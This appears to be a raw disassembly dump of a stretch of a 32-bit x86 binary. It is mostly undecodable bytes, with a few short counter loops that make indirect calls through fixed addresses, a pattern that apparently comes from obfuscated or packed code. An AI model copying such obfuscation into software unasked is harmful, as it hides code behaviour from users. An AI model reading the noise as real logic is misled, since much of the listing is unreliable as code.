  4073f5:	idiv   BYTE PTR [ebp+0x24]
  4073f8:	xchg   DWORD PTR [ebx-0x5cdef747],ebx
  4073fe:	and    DWORD PTR [edi],edi
  407400:	out    dx,al
  407401:	add    BYTE PTR [eax+eiz*1+0x240e360],bh
  407408:	out    0x36,eax
  40740a:	pushf  
  40740b:	into   
  40740c:	pop    es
  40740d:	sbb    dl,BYTE PTR [edi+0x2a]
  407410:	mov    eax,ds:0xf2a3958d
  407415:	mov    al,ds:0xeee9a0d9
  40741a:	inc    edi
  40741b:	ret    
  40741c:	scas   eax,DWORD PTR es:[edi]
  40741d:	ficom  DWORD PTR [ebx+edi*1+0xf]
  407421:	jnp    0x407475
  407423:	(bad)  
  407424:	mov    edi,0x9b5e870c
  407429:	fld    TBYTE PTR [eax-0x49b2559d]
  40742f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407430:	das    
  407431:	(bad)  
  407432:	nop
  407433:	stc    
  407434:	adc    esp,DWORD PTR [edi-0x69]
  407437:	lds    eax,FWORD PTR [ecx-0x791fa090]
  40743d:	pop    ds
  40743e:	mov    esi,0xdbce38e3
  407443:	adc    al,0xed
  407445:	xor    edx,eax
  407447:	mov    edi,DWORD PTR [ebp-0x10]
  40744a:	or     DWORD PTR ds:0x430357,0x71a5
  407454:	add    edx,ecx
  407456:	mov    DWORD PTR ds:0x4302c9,0x5a49
  407460:	cmp    edi,edx
  407462:	mov    DWORD PTR ds:0x43034f,0x6748
  40746c:	jmp    0x40761d
  407471:	not    DWORD PTR [ebp+edx*8-0xca68ae7]
  407478:	push   eax
  407479:	jb     0x4074d4
  40747b:	out    dx,eax
  40747c:	or     BYTE PTR [ebx-0x15],al
  40747f:	std    
  407480:	shl    BYTE PTR ds:0x8a7e7ec5,0x7f
  407487:	jle    0x407507
  407489:	adc    ah,BYTE PTR [edi+0x726b838e]
  40748f:	in     eax,dx
  407490:	xchg   ecx,eax
  407491:	lds    ebp,FWORD PTR [eax]
  407493:	es dec edi
  407495:	in     eax,dx
  407496:	(bad)  
  407497:	jmp    0xddf4:0x51b96895
  40749e:	pop    esp
  40749f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074a0:	ins    BYTE PTR es:[edi],dx
  4074a1:	and    bh,BYTE PTR [edx]
  4074a3:	add    DWORD PTR [edi+0x53],0x11
  4074a7:	aaa    
  4074a8:	mov    cl,0xed
  4074aa:	rol    BYTE PTR [ecx-0x76],1
  4074ad:	push   ecx
  4074ae:	add    edi,DWORD PTR [esi-0x709a3969]
  4074b4:	dec    edx
  4074b5:	mov    bh,0x84
  4074b7:	popa   
  4074b8:	mov    bl,0xa2
  4074ba:	fiadd  DWORD PTR [edx-0xd]
  4074bd:	or     DWORD PTR [edi-0x31],esp
  4074c0:	mov    ah,0x5e
  4074c2:	mov    ch,BYTE PTR [esi-0x55]
  4074c5:	pop    DWORD PTR [edi-0x7]
  4074c8:	ror    DWORD PTR fs:[ecx-0x4bb6946c],cl
  4074cf:	xor    DWORD PTR [ecx+0x74b57cd6],edi
  4074d5:	popa   
  4074d6:	ss aaa 
  4074d8:	popf   
  4074d9:	add    al,0xbc
  4074db:	and    ah,BYTE PTR [edi+0x10]
  4074de:	fs adc bh,bl
  4074e1:	and    dl,al
  4074e3:	retf   0x1f3c
  4074e6:	int3   
  4074e7:	popa   
  4074e8:	je     0x40753c
  4074ea:	sub    al,0x10
  4074ec:	shl    DWORD PTR [esp+edi*1+0x6b6ffaaa],cl
  4074f3:	jmp    0x227c:0x590b44f2
  4074fa:	(bad)  
  4074fb:	aad    0x68
  4074fd:	push   es
  4074fe:	xchg   esi,eax
  4074ff:	inc    edx
  407500:	push   esi
  407501:	iret   
  407502:	aas    
  407503:	mov    edx,0xb6280f61
  407508:	inc    esi
  407509:	mul    ch
  40750b:	mov    ah,0xe6
  40750d:	push   edi
  40750e:	popa   
  40750f:	retf   
  407510:	loop   0x407536
  407512:	leave  
  407513:	in     eax,dx
  407514:	and    BYTE PTR [eax],cl
  407516:	imul   DWORD PTR [ebx]
  407518:	xchg   ebp,eax
  407519:	jecxz  0x4074ab
  40751b:	imul   esp,DWORD PTR [ecx],0x1f
  40751e:	scas   al,BYTE PTR es:[edi]
  40751f:	test   eax,0x46c7fb20
  407524:	xor    dl,ch
  407526:	pop    edi
  407527:	jle    0x407525
  407529:	test   DWORD PTR [ebx],0x7210a28d
  40752f:	push   0x71562a92
  407534:	cmp    esi,edx
  407536:	xor    BYTE PTR [edx+0x2c987346],cl
  40753c:	sbb    dl,al
  40753e:	or     DWORD PTR [edx+0x3d],edi
  407541:	push   ss
  407542:	adc    ebp,eax
  407544:	sub    DWORD PTR [edi-0x54fcf101],esp
  40754a:	mov    ebp,0x6f1faf31
  40754f:	int    0x7
  407551:	fs dec ecx
  407553:	int3   
  407554:	loop   0x40757c
  407556:	gs (bad) 
  407558:	pop    ebx
  407559:	out    dx,eax
  40755a:	jl     0x4075bf
  40755c:	mov    dl,0x54
  40755e:	push   ebx
  40755f:	ficomp WORD PTR [ebx]
  407561:	mov    ebp,0x8aa958ef
  407566:	enter  0x63cc,0x71
  40756a:	jbe    0x407519
  40756c:	fchs   
  40756e:	(bad)  
  40756f:	sti    
  407570:	or     edi,DWORD PTR [edx+ebp*8]
  407573:	or     al,ah
  407575:	or     DWORD PTR [edi+0x3f],esi
  407578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407579:	cli    
  40757a:	add    DWORD PTR [ebx],eax
  40757c:	cdq    
  40757d:	mov    dl,BYTE PTR [ebx-0x7e047328]
  407583:	fst    DWORD PTR [edi+0x16]
  407586:	jmp    0x4dc4:0xf975f35d
  40758d:	mov    cl,0x5f
  40758f:	scas   eax,DWORD PTR es:[edi]
  407590:	int    0x64
  407592:	pop    ebx
  407593:	pop    esp
  407594:	fist   WORD PTR [ebx-0x7a87baa]
  40759a:	loopne 0x407596
  40759c:	pop    es
  40759d:	loopne 0x40757b
  40759f:	inc    edx
  4075a0:	mov    BYTE PTR [ecx-0x38],dh
  4075a3:	add    eax,0x98255143
  4075a8:	arpl   WORD PTR [esi+0xda00af7],cx
  4075ae:	jg     0x407536
  4075b0:	jge    0x4075ab
  4075b2:	enter  0xcb29,0xc1
  4075b6:	adc    eax,0xef7f7352
  4075bb:	repz push 0x7cb2ed47
  4075c1:	adc    ebx,DWORD PTR [ebp+0x2c]
  4075c4:	out    dx,al
  4075c5:	xchg   DWORD PTR [ecx-0x8],ebp
  4075c8:	sahf   
  4075c9:	jg     0x40761a
  4075cb:	pushf  
  4075cc:	outs   dx,BYTE PTR ds:[esi]
  4075cd:	mov    edi,0x5250c106
  4075d2:	push   0x2c643ff4
  4075d7:	sub    eax,0x84eca591
  4075dc:	add    eax,0x7a9f62a9
  4075e1:	shr    DWORD PTR [ebp+0x35],0x42
  4075e5:	pop    esp
  4075e6:	call   0x23bb:0xa73c8eef
  4075ed:	(bad)  
  4075ee:	shr    BYTE PTR [eax+0x37],cl
  4075f1:	(bad)  
  4075f2:	mov    ah,0xd2
  4075f4:	retf   
  4075f5:	nop
  4075f6:	cdq    
  4075f7:	sbb    DWORD PTR [eax+0x6b],ecx
  4075fa:	(bad)  
  4075fb:	lds    ecx,FWORD PTR ss:[edx]
  4075fe:	loope  0x407642
  407600:	or     DWORD PTR [esi],edi
  407602:	jbe    0x40765b
  407604:	popf   
  407605:	sbb    bh,dl
  407607:	jbe    0x407615
  407609:	ds in  al,0x6
  40760c:	ret    0x75a7
  40760f:	sar    cl,1
  407611:	adc    ecx,DWORD PTR [eax+0x15]
  407614:	xlat   BYTE PTR ds:[ebx]
  407615:	je     0x407690
  407617:	mov    dl,0xa2
  407619:	pop    edx
  40761a:	mov    ds:0x840f53e5,al
  40761f:	jmp    0x40763b
  407621:	add    BYTE PTR [eax],al
  407623:	push   ebx
  407624:	jmp    0x408d87
  407629:	and    DWORD PTR ds:0x42ec4b,0x0
  407633:	jmp    0x407647
  407638:	xor    edx,edx
  40763a:	xor    edx,DWORD PTR ds:0x42ec4b
  407640:	inc    edx
  407641:	mov    DWORD PTR ds:0x42ec4b,edx
  407647:	cmp    DWORD PTR ds:0x42ec4b,0x1b
  40764e:	jae    0x40768b
  407654:	cmp    DWORD PTR ds:0x42ec4b,0xa
  40765b:	jne    0x40766a
  407661:	push   DWORD PTR [ebp-0x10]
  407664:	call   DWORD PTR ds:0x42e933
  40766a:	cmp    DWORD PTR ds:0x42ec4b,0x9
  407671:	jne    0x407686
  407677:	xor    edx,edx
  407679:	xor    edx,DWORD PTR ds:0x42ec4b
  40767f:	inc    edx
  407680:	mov    DWORD PTR ds:0x42ec4b,edx
  407686:	jmp    0x407638
  40768b:	mov    edx,DWORD PTR [ebp-0x8]
  40768e:	mov    edi,DWORD PTR [ebp-0x10]
  407691:	sub    edi,edx
  407693:	jmp    0x407844
  407698:	or     DWORD PTR [ecx+0x67a86788],ebp
  40769e:	icebp  
  40769f:	jno    0x407690
  4076a1:	out    dx,al
  4076a2:	jns    0x4076bb
  4076a4:	dec    edi
  4076a5:	aas    
  4076a6:	xor    BYTE PTR [edi+0x7e7ec241],cl
  4076ac:	mov    bh,BYTE PTR [edi+0x7e]
  4076af:	jle    0x40769b
  4076b1:	daa    
  4076b2:	inc    ecx
  4076b3:	imul   esp,DWORD PTR [ebp-0x7],0x6
  4076b7:	icebp  
  4076b8:	ins    BYTE PTR es:[edi],dx
  4076b9:	std    
  4076ba:	jmp    0xf768:0x5863c1bc
  4076c1:	add    DWORD PTR [esi+0x18dfe875],ecx
  4076c7:	sbb    cl,ah
  4076c9:	into   
  4076ca:	stc    
  4076cb:	sub    al,0x5e
  4076cd:	xor    DWORD PTR [ecx+edx*4-0x46],esp
  4076d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076d3:	fimul  WORD PTR [ebx+0x36fcb86c]
  4076d9:	mov    esp,0x18deb488
  4076de:	jl     0x4076aa
  4076e0:	leave  
  4076e1:	outs   dx,BYTE PTR ds:[esi]
  4076e2:	cli    
  4076e3:	lahf   
  4076e4:	scas   eax,DWORD PTR es:[edi]
  4076e5:	pop    edx
  4076e6:	ss sahf 
  4076e8:	pop    ebp
  4076e9:	add    eax,0x76edc644
  4076ee:	push   ss
  4076ef:	mov    edx,0x48aca8a3
  4076f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076f5:	scas   al,BYTE PTR es:[edi]
  4076f6:	ins    WORD PTR es:[edi],dx
  4076f8:	xor    ecx,DWORD PTR [edi-0x1]
  4076fb:	fiadd  WORD PTR [ebx+edx*4+0x79c6cce4]
  407702:	jge    0x407766
  407704:	pop    eax
  407705:	iret   
  407706:	mov    esi,0xbcef298c
  40770b:	in     al,0xcf
  40770d:	push   cs
  40770e:	mov    bh,0xd7
  407710:	rol    BYTE PTR [esi-0x61d6b897],1
  407716:	scas   eax,DWORD PTR es:[edi]
  407717:	mov    ecx,0xf4400667
  40771c:	aaa    
  40771d:	sub    al,0x9a
  40771f:	jp     0x4076df
  407721:	push   ds
  407722:	in     eax,0x82
  407724:	push   ebx
  407725:	sti    
  407726:	jp     0x40774c
  407728:	jecxz  0x4076f5
  40772a:	xchg   BYTE PTR [esi+edi*2-0x36e9289],al
  407731:	sub    eax,0x5fcb5901
  407736:	push   esp
  407737:	and    DWORD PTR [ecx-0x4a14f5da],esp
  40773d:	push   ebp
  40773e:	jmp    0x96db:0xa91dd7d7
  407745:	sub    dh,BYTE PTR [esi-0x7]
  407748:	mov    eax,ds:0x7906fd6c
  40774d:	xor    DWORD PTR [ecx+eax*4],esp
  407750:	xchg   edi,eax
  407751:	xor    al,0x77
  407753:	dec    edi
  407754:	out    dx,al
  407755:	iret   
  407756:	repz ja 0x407712
  407759:	test   ecx,ebp
  40775b:	arpl   WORD PTR ds:0xbad9ab4,si
  407761:	lds    eax,FWORD PTR [ecx]
  407763:	iret   
  407764:	mov    bh,0x9f
  407766:	pop    eax
  407767:	lea    eax,[ecx]
  407769:	imul   edi,DWORD PTR ss:[edi-0x42],0xc2b809e
  407771:	arpl   WORD PTR [edx],dx
  407773:	pop    esp
  407774:	adc    cl,bh
  407776:	adc    eax,0x49631650
  40777b:	mov    ds:0x24010517,al
  407780:	in     al,dx
  407781:	idiv   BYTE PTR [esi-0x2e6de091]
  407787:	mov    eax,ds:0x4ca9e95e
  40778c:	pop    ecx
  40778d:	mov    BYTE PTR ds:0x41e16242,ah
  407793:	into   
  407794:	mov    esp,0x5d8be614
  407799:	dec    sp
  40779b:	dec    ebx
  40779c:	std    
  40779d:	mov    ebx,0x5f89ed3a
  4077a2:	cmp    BYTE PTR [edx-0x61272ede],bh
  4077a8:	adc    DWORD PTR [ecx],esp
  4077aa:	std    
  4077ab:	xor    dh,BYTE PTR [esi+0x28552f89]
  4077b1:	cdq    
  4077b2:	ds jge 0x4077fd
  4077b5:	xlat   BYTE PTR ds:[ebx]
  4077b6:	int    0xef
  4077b8:	pop    esi
  4077b9:	imul   ebx,DWORD PTR [edi+0x38],0xffffffe7
  4077bd:	(bad)  
  4077be:	jnp    0x40782a
  4077c0:	or     al,0xff
  4077c2:	mov    ebp,0xcbbe02ed
  4077c7:	inc    edx
  4077c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077c9:	add    BYTE PTR [esi+0xf88ecd7],ch
  4077cf:	mov    esi,0x82a9cfe4
  4077d4:	dec    edx
  4077d5:	mov    al,ds:0xe8c11add
  4077da:	loopne 0x407784
  4077dc:	mov    esp,0xbf3d20cd
  4077e1:	fadd   DWORD PTR [ebx+0x3c21e5a5]
  4077e7:	js     0x4077bb
  4077e9:	add    BYTE PTR [edi-0x22be904c],bl
  4077ef:	pop    eax
  4077f0:	mov    al,ds:0x3d498245
  4077f5:	cmc    
  4077f6:	shl    DWORD PTR [ebx-0x75],0x97
  4077fa:	lahf   
  4077fb:	add    eax,0xb60e9d1f
  407800:	adc    eax,0x510614e7
  407805:	outs   dx,BYTE PTR ds:[esi]
  407806:	addr16 push es
  407808:	mov    al,0x9
  40780a:	stc    
  40780b:	adc    ebx,edi
  40780d:	add    edi,esp
  40780f:	xchg   esp,eax
  407810:	mov    DWORD PTR [edi-0x56],esi
  407813:	or     eax,0xf87c756d
  407818:	std    
  407819:	call   DWORD PTR [eax]
  40781b:	lahf   
  40781c:	stc    
  40781d:	(bad)  
  40781e:	hlt    
  40781f:	scas   al,BYTE PTR es:[edi]
  407820:	mov    ch,0x1f
  407822:	xchg   esi,eax
  407823:	adc    DWORD PTR [edx-0x2f],edi
  407826:	jnp    0x407894
  407828:	sub    edi,DWORD PTR [edx+edx*8]
  40782b:	into   
  40782c:	mov    esi,0x3ff2db0d
  407831:	int    0x98
  407833:	inc    edi
  407834:	out    0x8c,al
  407836:	inc    eax
  407837:	out    dx,al
  407838:	stos   BYTE PTR es:[edi],al
  407839:	loop   0x407856
  40783b:	jb     0x4077f0
  40783d:	mov    cl,0xd8
  40783f:	addr16 xchg edi,eax
  407841:	inc    edx
  407842:	not    edx
  407844:	mov    edx,DWORD PTR [ebp-0x4]
  407847:	adc    DWORD PTR ds:0x4302c9,0x43034f
  407851:	xor    edx,eax
  407853:	add    edx,ecx
  407855:	cmp    edi,edx
  407857:	mov    DWORD PTR ds:0x4302ed,0x688e
  407861:	jb     0x40910d
  407867:	mov    DWORD PTR ds:0x42e644,0x1e
  407871:	cmp    DWORD PTR ds:0x42e644,0x0
  407878:	je     0x4078a9
  40787e:	cmp    DWORD PTR ds:0x42e644,0x25
  407885:	jne    0x407896
  40788b:	push   0x2141
  407890:	call   DWORD PTR ds:0x42e937
  407896:	mov    edi,DWORD PTR ds:0x42e644
  40789c:	dec    edi
  40789d:	mov    DWORD PTR ds:0x42e644,edi
  4078a3:	jmp    0x407871
  4078a8:	inc    edx
  4078a9:	mov    edx,DWORD PTR [ebp-0x28]
  4078ac:	mov    edi,DWORD PTR [ebp-0x4]
  4078af:	xor    edx,eax
  4078b1:	xor    edi,eax
  4078b3:	sub    ebx,DWORD PTR ds:0x42ec4f
  4078b9:	add    edi,ecx
  4078bb:	add    edx,ecx
  4078bd:	and    DWORD PTR ds:0x4302bd,0x0
  4078c7:	xor    ebx,ebx
  4078c9:	or     ebx,DWORD PTR ds:0x4302bd
  4078cf:	inc    ebx
  4078d0:	mov    DWORD PTR ds:0x4302bd,ebx
  4078d6:	cmp    DWORD PTR ds:0x4302bd,0x15
  4078dd:	jne    0x4078f1
  4078e3:	push   0x1
  4078e5:	push   DWORD PTR [ebp-0x20]
  4078e8:	push   DWORD PTR [ebp-0x10]
  4078eb:	call   DWORD PTR ds:0x42eaa7
  4078f1:	cmp    DWORD PTR ds:0x4302bd,0x11
  4078f8:	jb     0x4078c7
  4078fe:	imul   edx,edi
  407901:	mov    edi,DWORD PTR [ebp-0x8]
  407904:	mov    ebx,DWORD PTR [ebp-0x10]
  407907:	sub    ebx,edi
  407909:	cmp    ebx,edx
  40790b:	ja     0x40791d
  407911:	mov    edx,DWORD PTR [ebp-0x4]
  407914:	xor    edx,eax
  407916:	add    edx,ecx
  407918:	jmp    0x40877e
  40791d:	mov    edx,DWORD PTR [ebp-0x2c]
  407920:	mov    edi,DWORD PTR [ebp-0x4]
  407923:	xor    edx,eax
  407925:	xor    edi,eax
  407927:	add    edi,ecx
  407929:	add    edx,ecx
  40792b:	imul   edx,edi
  40792e:	mov    edi,DWORD PTR [ebp-0x8]
  407931:	jmp    0x407ae2
  407936:	ret    0x1100
  407939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793a:	shl    DWORD PTR [ebp+0x7ad26172],1
  407940:	dec    edi
  407941:	(bad)  
  407942:	clc    
  407943:	adc    esp,DWORD PTR [esi]
  407945:	push   edx
  407946:	ffree  st(0)
  407948:	jle    0x4079c8
  40794a:	mov    bh,BYTE PTR [edi+0x7e]
  40794d:	jle    0x4078e1
  40794f:	(bad)  
  407950:	rol    BYTE PTR [edi-0x2165ad42],cl
  407956:	cmp    ecx,DWORD PTR [eax-0x5c9191a8]
  40795c:	and    al,0x39
  40795e:	mov    WORD PTR [ecx+ebx*4+0xccc7447],cs
  407965:	xor    bh,BYTE PTR [edi-0x66]
  407968:	jle    0x40791a
  40796a:	test   eax,0xdbc88099
  40796f:	xchg   edi,eax
  407970:	dec    edi
  407971:	aas    
  407972:	sbb    DWORD PTR [edx-0x39],ecx
  407975:	lods   eax,DWORD PTR ds:[esi]
  407976:	push   ds
  407977:	xchg   esi,eax
  407978:	dec    ebx
  407979:	outs   dx,DWORD PTR ds:[esi]
  40797a:	ins    BYTE PTR es:[edi],dx
  40797b:	xchg   edx,eax
  40797c:	mov    ebx,0x6e8c13f6
  407981:	inc    edi
  407982:	push   DWORD PTR [eax+0x49050671]
  407988:	cmp    al,0x84
  40798a:	cmp    bl,BYTE PTR [ebp-0x655ffb5c]
  407990:	test   bh,bl
  407992:	dec    esp
  407994:	sub    BYTE PTR [edi-0x42],cl
  407997:	mov    dh,0xe3
  407999:	pop    edi
  40799a:	xor    eax,0xd39da12c
  40799f:	pusha  
  4079a0:	int3   
  4079a1:	mov    BYTE PTR [esi-0x7d],ch
  4079a4:	int3   
  4079a5:	js     0x407942
  4079a7:	retf   0xf751
  4079aa:	sub    eax,0x7f5b35a0
  4079af:	dec    edi
  4079b0:	xchg   DWORD PTR [edx],ebp
  4079b2:	inc    edx
  4079b3:	mov    ss,WORD PTR [ebp+ebp*8-0x592707d7]
  4079ba:	stos   DWORD PTR es:[edi],eax
  4079bb:	je     0x407956
  4079bd:	cs mov edx,0x34fd23f6
  4079c3:	clc    
  4079c4:	cmp    cl,bh
  4079c6:	in     eax,0x1
  4079c8:	sub    BYTE PTR [eax+0x643c030b],cl
  4079ce:	add    al,0x24
  4079d1:	pop    es
  4079d2:	mov    ebp,0xefb1b0f2
  4079d7:	cmp    bh,bh
  4079d9:	push   esi
  4079da:	mov    eax,ds:0xf719d026
  4079df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079e0:	xchg   esi,eax
  4079e1:	push   eax
  4079e2:	sbb    al,0x9d
  4079e4:	(bad)  
  4079e5:	lods   eax,DWORD PTR ds:[esi]
  4079e6:	imul   edi,ebp,0xb0ef3566
  4079ec:	(bad)  [ecx+0x28]
  4079ef:	fild   QWORD PTR [edi+ecx*4]
  4079f2:	ss mov ch,0x62
  4079f5:	test   al,0x95
  4079f7:	sub    ecx,DWORD PTR [ecx]
  4079f9:	pop    ds
  4079fa:	push   eax
  4079fb:	or     al,cl
  4079fd:	fisubr WORD PTR es:[ecx-0x3e229720]
  407a04:	pop    ds
  407a05:	fist   DWORD PTR [ebx-0x1c]
  407a08:	xchg   esi,eax
  407a09:	or     al,0xfb
  407a0b:	icebp  
  407a0c:	jae    0x407a87
  407a0e:	scas   al,BYTE PTR es:[edi]
  407a0f:	add    edx,esi
  407a11:	jg     0x407a1c
  407a13:	xchg   esi,eax
  407a14:	mov    al,0x89
  407a16:	ret    
  407a17:	pop    es
  407a18:	push   esi
  407a19:	in     al,0xd9
  407a1b:	call   0xfd925598
  407a20:	mov    esp,0xcec6d7e2
  407a25:	shl    BYTE PTR [ebx],cl
  407a27:	sub    edx,DWORD PTR [ecx+ebx*2]
  407a2a:	js     0x407a4b
  407a2c:	fwait
  407a2d:	jno    0x4079dd
  407a2f:	mov    bl,0x73
  407a31:	pop    esi
  407a32:	adc    DWORD PTR [ecx-0x4b],esi
  407a35:	int3   
  407a36:	sbb    eax,0x7db924ca
  407a3b:	dec    eax
  407a3c:	mov    ebx,0x3595f365
  407a41:	xchg   BYTE PTR [ebp+0x666a3207],ch
  407a47:	aad    0x1f
  407a49:	int    0x76
  407a4b:	sub    DWORD PTR [eax],ebp
  407a4d:	ins    DWORD PTR es:[edi],dx
  407a4e:	sbb    al,0x57
  407a50:	fnstenv [edi+0x63]
  407a53:	pop    ebx
  407a54:	inc    ecx
  407a55:	jmp    0x407aa9
  407a57:	or     BYTE PTR [esi],0xa9
  407a5a:	mov    WORD PTR [esi-0x555beca8],ds
  407a60:	add    edi,DWORD PTR [ebx]
  407a62:	out    0x15,eax
  407a64:	or     al,0x77
  407a66:	or     edx,esi
  407a68:	cmc    
  407a69:	sub    DWORD PTR ds:0x2b38e660,esp
  407a6f:	cmp    cl,dl
  407a71:	inc    edi
  407a72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a73:	and    BYTE PTR [eax+eax*2-0x2c2f1d2b],bl
  407a7a:	popf   
  407a7b:	dec    esp
  407a7c:	xor    BYTE PTR [ecx],dh
  407a7e:	sub    BYTE PTR [edx+0x5b5d1e26],ch
  407a84:	cmp    esp,DWORD PTR [edx-0x74]
  407a87:	lods   eax,DWORD PTR ds:[esi]
  407a88:	(bad)  
  407a89:	sub    edi,DWORD PTR [esi]
  407a8b:	adc    esi,DWORD PTR [ebp+0x5843958c]
  407a91:	repz lahf 
  407a93:	xor    ch,ah
  407a95:	clc    
  407a96:	fwait
  407a97:	lods   al,BYTE PTR ds:[esi]
  407a98:	jns    0x407a7a
  407a9a:	adc    eax,0x70c40b59
  407a9f:	test   DWORD PTR [eax+edi*4],edi
  407aa2:	lahf   
  407aa3:	(bad)  
  407aa4:	lods   eax,DWORD PTR ds:[esi]
  407aa5:	pop    edx
  407aa6:	rcr    DWORD PTR [ecx],cl
  407aa8:	adc    al,0xa
  407aaa:	sbb    eax,0x75090c21
  407aaf:	jno    0x407a73
  407ab1:	jecxz  0x407ac2
  407ab3:	mov    BYTE PTR [edi],0x6c
  407ab6:	nop
  407ab7:	mov    DWORD PTR [ebx-0x3846b16f],ebx
  407abd:	int    0x83
  407abf:	into   
  407ac0:	and    BYTE PTR [ebp+0x6657b513],bh
  407ac6:	(bad)  
  407ac7:	call   0x5aa49297
  407acc:	pushf  
  407acd:	(bad)  
  407ace:	std    
  407acf:	nop
  407ad0:	xchg   DWORD PTR [eax-0x64326f9f],esi
  407ad6:	aas    
  407ad7:	(bad)  
  407ad8:	mov    esi,0x50a86b00
  407add:	add    BYTE PTR [ebx-0x74c44272],cl
  407ae3:	pop    ebp
  407ae4:	lock sub ebx,edi
  407ae7:	cmp    ebx,edx
  407ae9:	ja     0x407af7
  407aef:	mov    edx,DWORD PTR [ebp-0x28]
  407af2:	jmp    0x408770
  407af7:	mov    edx,DWORD PTR [ebp-0x30]
  407afa:	mov    edi,DWORD PTR [ebp-0x4]
  407afd:	jmp    0x407cae
  407b02:	mov    WORD PTR [edx+0x6130bf0c],?
  407b08:	dec    ebp
  407b09:	jno    0x407ae6
  407b0b:	les    ecx,FWORD PTR [esi-0x7a09bc36]
  407b11:	jb     0x407b7c
  407b13:	sar    DWORD PTR [esi+0x7e],0x8a
  407b17:	jg     0x407b97
  407b19:	jle    0x407b1c
  407b1b:	les    eax,FWORD PTR [ebp+0x4a]
  407b1e:	xchg   ebx,eax
  407b1f:	test   DWORD PTR [eax+edi*8-0x85af06],esp
  407b26:	test   BYTE PTR [eax],dh
  407b28:	mov    ds:0x788c8528,al
  407b2d:	jmp    FWORD PTR [edi-0x7c786a1a]
  407b33:	in     eax,dx
  407b34:	push   esp
  407b35:	int    0x97
  407b37:	cmp    eax,0xe20a03b
  407b3c:	aad    0x6c
  407b3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b3f:	push   ds
  407b40:	test   BYTE PTR [edi],ch
  407b42:	inc    ecx
  407b43:	test   eax,0xced87e8e
  407b48:	aas    
  407b49:	mov    ebp,edx
  407b4b:	xor    dl,BYTE PTR [eax]
  407b4d:	and    al,0xe6
  407b4f:	movaps xmm2,xmm1
  407b52:	push   esi
  407b53:	inc    ebp
  407b54:	mov    bh,0x5b
  407b56:	div    BYTE PTR [ebp*8+0x716f163a]
  407b5d:	pop    edi
  407b5e:	sub    bl,BYTE PTR [ecx+0x4e26e9ef]
  407b64:	stc    
  407b65:	ja     0x407b48
  407b67:	sbb    al,0xd1
  407b69:	dec    ecx
  407b6a:	and    DWORD PTR [eax-0x10],edx
  407b6d:	ins    BYTE PTR es:[edi],dx
  407b6e:	dec    ebx
  407b6f:	jge    0x407baa
  407b71:	div    DWORD PTR [edi-0x3]
  407b74:	fnstenv [edi]
  407b76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b77:	jb     0x407bb3
  407b79:	ds push esp
  407b7b:	adc    al,0x57
  407b7d:	or     ch,BYTE PTR [esi+0x26ae7c1d]
  407b83:	fmul   QWORD PTR [ecx+0x3ee11cca]
  407b89:	mov    WORD PTR [eax],?
  407b8b:	cld    
  407b8c:	sbb    al,0x89
  407b8e:	int    0x9
  407b90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b91:	stc    
  407b92:	mov    bl,0xcc
  407b94:	js     0x407c05
  407b96:	addr16 js 0x407b4f
  407b99:	ds and ebp,edx
  407b9c:	push   esi
  407b9d:	retf   0xbdd5
  407ba0:	cmc    
  407ba1:	xchg   esi,eax
  407ba2:	cld    
  407ba3:	jmp    0x407b56
  407ba5:	and    ebp,DWORD PTR [ebp+0x23a92128]
  407bab:	in     eax,0x34
  407bad:	(bad)  
  407baf:	iret   
  407bb0:	popa   
  407bb1:	dec    ebx
  407bb2:	bound  esi,QWORD PTR [ebx]
  407bb4:	fistp  DWORD PTR [esp+edi*8-0x4e]
  407bb8:	sbb    eax,0x3ae8748e
  407bbd:	inc    ecx
  407bbe:	sbb    ch,BYTE PTR [edi+0x24]
  407bc1:	lds    edx,FWORD PTR [edx]
  407bc3:	test   BYTE PTR [ecx-0x7fd78122],dh
  407bc9:	adc    ch,bl
  407bcb:	xchg   esi,eax
  407bcc:	push   edx
  407bcd:	cmp    DWORD PTR [ecx-0x46bbee7f],0xe2076d58
  407bd7:	in     eax,0x28
  407bd9:	dec    ebp
  407bda:	mov    esp,0xe38aff53
  407bdf:	or     al,0xd5
  407be1:	mov    eax,ds:0x9c1cd573
  407be6:	sub    ebx,DWORD PTR [edx]
  407be8:	sbb    BYTE PTR [ebx-0x3bfd605],bh
  407bee:	xor    ebx,eax
  407bf0:	jnp    0x407c24
  407bf2:	mov    ebp,0x597f9026
  407bf7:	into   
  407bf8:	ins    BYTE PTR es:[edi],dx
  407bf9:	out    dx,al
  407bfa:	add    ebp,DWORD PTR [edx+eiz*1+0x19]
  407bfe:	and    DWORD PTR [ebx+edi*1+0x1c],ebx
  407c02:	out    dx,eax
  407c03:	stos   DWORD PTR es:[edi],eax
  407c04:	jae    0x407bec
  407c06:	addr16 pushf 
  407c08:	adc    BYTE PTR [ebp+0x2e],0xe5
  407c0c:	xor    esi,DWORD PTR [edx]
  407c0e:	ins    BYTE PTR es:[edi],dx
  407c0f:	mov    DWORD PTR [esi],eax
  407c11:	aad    0xc4
  407c13:	(bad)  
  407c14:	push   cs
  407c15:	inc    edx
  407c16:	push   ecx
  407c17:	jnp    0x407c90
  407c19:	xchg   ecx,ebp
  407c1b:	pop    ebp
  407c1c:	add    eax,0x8a26c82d
  407c21:	aaa    
  407c22:	cld    
  407c23:	into   
  407c24:	in     al,0x21
  407c26:	sbb    BYTE PTR [ebx],bh
  407c28:	ss inc eax
  407c2a:	lods   eax,DWORD PTR ds:[esi]
  407c2b:	mov    ah,BYTE PTR [edx+ebp*8]
  407c2e:	sbb    al,0x7b
  407c30:	add    edx,DWORD PTR [ecx-0x73]
  407c33:	into   
  407c34:	(bad)  
  407c35:	push   eax
  407c36:	sahf   
  407c37:	inc    ebx
  407c38:	ficomp DWORD PTR [esi-0x2e3c641f]
  407c3e:	add    esp,edi
  407c40:	pop    eax
  407c41:	sti    
  407c42:	inc    edx
